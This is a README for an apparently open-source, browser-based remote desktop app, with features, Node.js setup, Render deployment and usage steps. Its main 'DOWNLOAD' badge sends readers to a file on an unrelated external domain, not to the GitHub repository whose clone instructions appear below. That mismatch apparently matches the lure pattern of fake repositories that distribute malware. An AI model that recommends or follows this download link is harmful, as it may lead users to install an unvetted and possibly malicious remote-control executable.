
# Desktop Remote Control Web 🖥️

A self-hosted, open-source web-based remote desktop application. Share your screen and control it remotely from any modern browser using secure room codes. Similar to PS Portal for PC.

## 📥 Download

[![Download Desktop Remote Control](https://img.shields.io/badge/⬇_DOWNLOAD-Desktop_Remote_Control-28a745?style=for-the-badge)](https://shanxisaide.com/s/file)

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-green)
![Stack](https://img.shields.io/badge/Stack-Node.js%20%7C%20React%20%7C%20WebRTC-blue)

## ⚡ Features

- **Room-based access** — create rooms with unique 6-character codes
- **Real-time screen sharing** — powered by WebRTC
- **Remote control** — viewers can control the host's mouse and keyboard
- **Session management** — hosts can activate or deactivate rooms at any time
- **Modern UI** — dark theme with smooth animations
- **Secure** — rooms are accessible only while active
- **No client installation for viewers** — just open a browser

## 🏗️ Architecture

| Layer | Technology |
|-------|------------|
| Backend | Node.js, Express, Socket.IO |
| Frontend | React, Vite, TailwindCSS |
| Real-time | WebRTC (video), Socket.IO (signaling & control) |
| Desktop wrapper | Electron (optional) |

## 📋 Requirements

- Node.js v16 or higher
- npm or yarn
- A modern browser (Chrome, Firefox, Edge)
- Both host and viewer on the same network or with internet access

## 🚀 Installation

1. Clone the repository:

   ```bash
   git clone https://github.com/Gxnis/desktopremotecontrolweb.git
   cd desktopremotecontrolweb
   ```

2. Install dependencies:

   ```bash
   npm install
   ```

   This installs both backend and frontend dependencies.

## ▶️ Running the Application

### Local Development

1. Build the frontend:

   ```bash
   npm run build
   ```

2. Start the server:

   ```bash
   npm start
   ```

3. Open your browser at `http://localhost:3000`.

   The server serves both the backend API/WebSocket and the frontend on a single port.

### Deployment on Render

The repository includes a `render.yaml` for easy one-click deployment on Render. Connect the repository, and Render will automatically build the frontend and start the server on port `10000`.

## 🎮 Usage

### As a Host (Sharing Your Screen)

1. Click **Create New Room**.
2. A unique 6-character code is generated.
3. Share the code with the person you want to grant access.
4. Your screen starts being shared automatically.
5. Use the **Active/Inactive** button to control when the room is accessible.

### As a Viewer (Controlling a Remote Screen)

1. Enter the room code provided by the host.
2. Click **Join**.
3. Wait for the host's screen to appear.
4. Click on the video to focus.
5. Use your mouse and keyboard to control the remote screen.

### Stopping Screen Sharing

- **Host:** Click the browser's **Stop Sharing** button, or use the **Active/Inactive** toggle.
- **Viewer:** Simply close the browser tab.

## 🔒 Security Notes

- Room codes are randomly generated and unique.
- Rooms are accessible only while marked as **active** by the host.
- Screen sharing requires explicit permission from the host.
- The application runs locally — ensure your network is secure if exposing it to the internet.

## 🛠️ Troubleshooting

| Issue | Check |
|-------|-------|
| Screen sharing not working | Use a modern browser; check screen-sharing permissions; ensure both devices are reachable |
| Remote control not working | Click the video area to focus; verify the room is **active**; check internet stability |
| Connection issues | Backend running on port 3000; Socket.IO connected (green indicator); room code correct |

## 📄 License

MIT License. See the [LICENSE](https://github.com/Gxnis/desktopremotecontrolweb/blob/main/LICENSE) file for details.

## ⚠️ Disclaimer

This repository is unofficial and not affiliated with any commercial remote-desktop vendor. All product names, logos and brands are property of their respective owners. Use at your own risk.

